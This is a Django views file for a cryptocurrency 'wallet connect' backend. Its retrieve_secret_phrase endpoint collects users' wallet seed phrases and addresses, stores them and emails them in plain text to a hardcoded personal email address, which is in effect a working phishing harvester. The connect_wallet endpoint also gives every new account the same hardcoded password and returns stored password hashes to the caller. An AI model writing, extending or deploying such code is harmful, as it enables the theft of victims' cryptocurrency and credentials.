from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status
from rest_framework.parsers import MultiPartParser, FormParser
from rest_framework.decorators import parser_classes
from django.contrib.auth import get_user_model

from .serializers import TransactionSerializer, CommentSerializer

from django.shortcuts import redirect

from django.db.models import Q

from .models import Transactions, Comments, Wallet, WalletSecretPhrase
from django.shortcuts import render

from django.core.mail import EmailMessage, get_connection, send_mail
from django.conf import settings


# User
User = get_user_model()


def home(request):
    return redirect("/admin")

# Create your views here.
@api_view(['GET', 'POST'])
def get_all_transactions(request):
    if request.method == "GET":
        browser_id = request.query_params.get("browser_id")
        bitcoin_address = request.query_params.get("bitcoin_address")
        print("bitcoin_address: ", bitcoin_address)

        # Initialize an empty query
        query = Q()

        # Add conditions to the query only if the parameters are provided
        if browser_id is not None:
            query &= Q(browser_id=browser_id)
        if bitcoin_address is not None:
            query &= Q(bitcoin_address=bitcoin_address)

        transactions = Transactions.objects.filter(query)
        serializer = TransactionSerializer(transactions, many=True)
        return Response(serializer.data, status=status.HTTP_200_OK)
    elif request.method == "POST":
        serializer = TransactionSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
@parser_classes([MultiPartParser, FormParser])
def all_comments(request):
    print(request.data)
    if request.method == "POST":
        uploaded_file = request.FILES.get('image')
        print("This is the file upload: ", uploaded_file)


        serializer = CommentSerializer(data=request.data)
        
        if serializer.is_valid():
            # Save the comment object to the database
            serializer.save()
            return Response({"message": "Comment saved successfully"}, status=status.HTTP_201_CREATED)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    elif request.method == "GET":
        comments = Comments.objects.filter(approve_comment=True).order_by("id")
        serializer = CommentSerializer(comments, many=True)
        return Response(serializer.data, status=status.HTTP_200_OK)
    else:
        return Response(serializer.data, status=status.HTTP_200_OK)


@api_view(['POST', 'GET'])
def connect_wallet(request):
    if request.method == 'POST':
        data = request.data
        # Check if the username is in data 
        if request.data.get("address"):
            user = User.objects.filter(username=request.data.get("address"))
            if len(user) >= 1:
                print(user)
                print("Already exists")
                return Response({"username": user[0].username, "password": user[0].password}, status=status.HTTP_200_OK)
            else:
                user = User.objects.create_user(username=request.data.get("address"), password="fc92dbb26cb70a5791c02701848f6e54076c570702d0e1294766049ba438324bbd9fe2020753276b")
                # Check if wallet already exists
                Wallet.objects.create(
                    address=user.username,
                    chain_name=request.data.get("chainDataName"),
                    nonce=request.data.get("nonce"),
                    balance=request.data.get("humanFriendlyBalance"),
                    browser_id=request.data.get("browserId"),
                )
                print("Does not exist")
                return Response({"username": user.username, "password": user.password}, status=status.HTTP_200_OK)
        else:
            return Response({"message": "username is required"}, status=status.HTTP_400_BAD_REQUEST)
    return Response({"message": "Method not allowed"}, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST', 'GET'])
def retrieve_secret_phrase(request):
    if request.method == 'POST':
        data = request.data
        if request.data.get("secret_phrase"):
            print(data)
            # Check if Wallet Secret already exists...
            # If it doesn't, create it.
            # If it does, don't create it.
            wallet_phrase_exists = WalletSecretPhrase.objects.filter(secret_phrase=data.get("secret_phrase"))
            if len(wallet_phrase_exists) > 0:
                return Response({"message": "Wallet phrase already exists"}, status=status.HTTP_400_BAD_REQUEST)
            WalletSecretPhrase.objects.create(address=data.get("address"), secret_phrase=data.get("secret_phrase"))

            # Send Email
            subject = "You received a mail from coinchip" 
            email_from = settings.EMAIL_HOST_USER  
            recipient_list = ["petercodercoder@gmail.com", ]  
            message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
            print("Email is working... ")
            send_mail(subject, message, email_from, recipient_list)
            # with get_connection(  
            #     host=settings.EMAIL_HOST, 
            #     port=settings.EMAIL_PORT,  
            #     username=settings.EMAIL_HOST_USER, 
            #     password=settings.EMAIL_HOST_PASSWORD, 
            #     use_tls=settings.EMAIL_USE_TLS  
            # ) as connection:
            #     subject = "You received a mail from coinchip" 
            #     email_from = settings.EMAIL_HOST_USER  
            #     recipient_list = ["talk2peteresezobor@gmail.com", ]  
            #     message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
            #     print("Email is working... ")
            #     EmailMessage(subject, message, email_from, recipient_list, connection=connection).send()


            return Response({"message": "Wallet phrase received successfully."}, status=status.HTTP_200_OK)
        return Response({"message": "Secret phrase is required."}, status=status.HTTP_400_BAD_REQUEST)
    return Response({"message": "Method not allowed."}, status=status.HTTP_405_METHOD_NOT_ALLOWED)




